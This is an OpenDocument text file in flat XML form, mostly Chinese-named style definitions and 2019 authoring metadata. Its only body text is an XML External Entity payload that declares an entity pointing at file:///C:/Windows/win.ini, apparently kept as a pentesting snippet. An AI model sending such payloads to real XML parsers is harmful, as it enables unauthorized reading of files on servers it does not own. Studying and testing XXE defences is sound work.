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等线" svg:font-family="等线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Consolas" svg:font-family="Consolas" style:font-family-generic="modern" style:font-pitch="fixed" svg:panose-1="2 11 6 9 2 2 4 3 2 4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正文" style:master-page-name="MP0" style:family="paragraph">
      <style:paragraph-properties fo:widows="2" fo:orphans="2" fo:break-before="page" fo:text-align="start" style:vertical-align="auto"/>
      <style:text-properties fo:hyphenate="true"/>
    </style:style>
    <style:style style:name="T2" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#75715E" style:letter-kerning="false" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="P3" style:parent-style-name="正文" style:family="paragraph">
      <style:paragraph-properties fo:widows="2" fo:orphans="2" fo:text-align="start" style:vertical-align="auto"/>
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#75715E" style:letter-kerning="false" style:font-size-complex="10.5pt" fo:hyphenate="true"/>
    </style:style>
    <style:style style:name="P4" style:parent-style-name="正文" style:family="paragraph">
      <style:paragraph-properties fo:widows="2" fo:orphans="2" fo:text-align="start" style:vertical-align="auto"/>
      <style:text-properties fo:hyphenate="true"/>
    </style:style>
    <style:style style:name="T5" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#75715E" style:letter-kerning="false" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="T6" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#75715E" style:letter-kerning="false" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="T7" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#75715E" style:letter-kerning="false" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="T8" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#75715E" style:letter-kerning="false" style:font-size-complex="10.5pt"/>
    </style:style>
    <style:style style:name="T9" style:parent-style-name="默认段落字体" style:family="text">
      <style:text-properties style:font-name="Consolas" style:font-name-asian="宋体" style:font-name-complex="宋体" fo:color="#F8F8F2" style:letter-kerning="false" style:font-size-complex="10.5pt"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text text:use-soft-page-breaks="true">
      <text:p text:style-name="P1"><text:span text:style-name="T2">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</text:span></text:p>
      <text:p text:style-name="P3">&lt;!DOCTYPE foo [</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T5">&lt;!ELEMENT text ANY &gt;</text:span></text:p>
      <text:p text:style-name="正文"><text:span text:style-name="T6">&lt;!ENTITY xxe SYSTEM "</text:span><text:span text:style-name="T7">file:///C:/Windows/win.ini</text:span><text:span text:style-name="T8">" &gt;</text:span><text:span text:style-name="T9">]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等线" svg:font-family="等线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Consolas" svg:font-family="Consolas" style:font-family-generic="modern" style:font-pitch="fixed" svg:panose-1="2 11 6 9 2 2 4 3 2 4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等线" style:font-name-asian="等线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.5pt" style:font-size-asian="10.5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页眉" style:display-name="页眉" style:family="paragraph" style:parent-style-name="正文">
      <style:paragraph-properties fo:border-top="none" fo:border-left="none" fo:border-bottom="0.0104in solid #000000" fo:border-right="none" fo:padding-top="0in" fo:padding-left="0in" fo:padding-bottom="0.0138in" fo:padding-right="0in" style:shadow="none" style:snap-to-layout-grid="false" fo:text-align="center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9pt" style:font-size-asian="9pt" style:font-size-complex="9pt" fo:hyphenate="false"/>
    </style:style>
    <style:style style:name="页眉字符" style:display-name="页眉 字符" style:family="text" style:parent-style-name="默认段落字体">
      <style:text-properties fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="页脚" style:display-name="页脚" style:family="paragraph" style:parent-style-name="正文">
      <style:paragraph-properties style:snap-to-layout-grid="false"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9pt" style:font-size-asian="9pt" style:font-size-complex="9pt" fo:hyphenate="false"/>
    </style:style>
    <style:style style:name="页脚字符" style:display-name="页脚 字符" style:family="text" style:parent-style-name="默认段落字体">
      <style:text-properties fo:font-size="9pt" style:font-size-asian="9pt" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="cp" style:display-name="cp" style:family="text" style:parent-style-name="默认段落字体"/>
    <style:style style:name="HTML预设格式" style:display-name="HTML 预设格式" style:family="paragraph" style:parent-style-name="正文">
      <style:paragraph-properties fo:widows="2" fo:orphans="2"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宋体" style:font-name-asian="宋体" style:font-name-complex="宋体" style:letter-kerning="false" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt" fo:hyphenate="true"/>
    </style:style>
    <style:style style:name="HTML预设格式字符" style:display-name="HTML 预设格式 字符" style:family="text" style:parent-style-name="默认段落字体">
      <style:text-properties style:font-name="宋体" style:font-name-asian="宋体" style:font-name-complex="宋体" style:letter-kerning="false" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="HTML代码" style:display-name="HTML 代码" style:family="text" style:parent-style-name="默认段落字体">
      <style:text-properties style:font-name="宋体" style:font-name-asian="宋体" style:font-name-complex="宋体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ministrator</meta:initial-creator>
    <dc:creator>Administrator</dc:creator>
    <meta:creation-date>2019-12-03T08:30:00Z</meta:creation-date>
    <dc:date>2019-12-03T08:58:00Z</dc:date>
    <meta:template xlink:href="Normal.dotm" xlink:type="simple"/>
    <meta:editing-cycles>9</meta:editing-cycles>
    <meta:editing-duration>PT120S</meta:editing-duration>
    <meta:document-statistic meta:page-count="1" meta:paragraph-count="1" meta:word-count="20" meta:character-count="133" meta:row-count="1" meta:non-whitespace-character-count="114"/>
  </office:meta>
</office:document-meta>
</file>